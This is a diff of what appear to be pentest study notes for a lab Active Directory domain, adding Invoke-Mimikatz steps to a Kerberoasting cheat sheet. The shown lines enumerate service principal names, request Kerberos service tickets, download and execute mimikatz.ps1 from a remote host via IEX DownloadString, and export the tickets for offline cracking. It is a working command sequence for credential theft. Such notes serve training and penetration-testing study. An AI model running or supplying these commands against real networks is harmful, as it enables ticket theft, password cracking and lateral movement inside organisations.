@@ -95,4 +95,6 @@ Then load - Add-Type -AssemblyName System.IdentityModel <br>
   Change the argument list parameter to a name taken when using setspn.exe <br>
   Now you can load all tickets - setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() } <br>
   Run mimikatz (download fromn machine that can access the internet - IEX (New-Object System.Net.Webclient).DownloadString('http://10.10.14.160:8000/mimikatz.ps1') <br>
+  Invoke-Mimikatz base64 /out:true <br>
+ Invoke-Mimikatz -Command '"kerberos::list /export"'
 
